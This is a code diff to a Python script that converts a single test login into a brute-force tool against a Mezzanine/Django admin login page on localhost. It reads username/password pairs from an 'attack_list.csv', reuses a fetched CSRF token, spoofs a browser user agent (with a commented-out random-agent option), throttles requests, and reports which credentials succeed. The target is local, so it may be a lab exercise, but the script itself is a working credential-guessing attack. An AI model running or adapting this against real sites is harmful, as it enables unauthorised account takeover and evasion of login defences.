@@ -1,6 +1,13 @@
 # -*- coding: utf-8 -*-
 
+import csv
+import os
+from time import sleep
+
 import requests
+
+# NOTE: when you want to use Random-UserAgent, you should delete commentout some lines
+#from fake_useragent import UserAgent
 
 
 def acccess(http_info):
@@ -25,30 +32,44 @@ def acccess(http_info):
         print(e)
 
 
-def main(user, pass_):
+def attacker(user, pass_):
     res = acccess({
         'method': 'GET',
         'url': 'http://127.0.0.1:8000/admin',
     })
     cookie = res.cookies['csrftoken']
-
+    # NOTE: you should deley to access by using sleep function
+    sleep(1)
+    #ua = UserAgent(cache=False)
     res = acccess({
         'method': 'POST',
         'url': 'http://127.0.0.1:8000/ja/admin/login/',
         'querystring': {'next': '/ja/admin'},
         'payload': 'username={}&password={}&this_is_the_login_form=1&mezzanine_login_interface=admin&csrfmiddlewaretoken={}'.format(user, pass_, cookie),
         'headers': {
+            'useragent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+            #'useragent': ua.random,
             'cookie': 'csrftoken={}'.format(cookie),
             'referer': 'http://127.0.0.1:8000/',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'http://127.0.0.1:8000',
             'cache-control': 'no-cache',
-            'postman-token': '65f3c7af-fb2a-553d-f697-bc31821e69ef'
         },
     })
-    print(res.text)
+    if "ダッシュボード" in res.text:
+        print("User: {}, Pass: {}, Result: Succeeded".format(user, pass_))
+    else:
+        print("User: {}, Pass: {}, Result: Failed".format(user, pass_))
+
+
+def main():
+    with open((os.path.normpath(os.path.join(os.path.abspath('__file__'), './../attack_list.csv')))) as f:
+        reader = csv.reader(f)
+        header = next(reader)
+        for row in reader:
+            attacker(str(row[0]), str(row[1]))
 
 
 if __name__ == '__main__':
-    main("tom", "tom")
+    main()
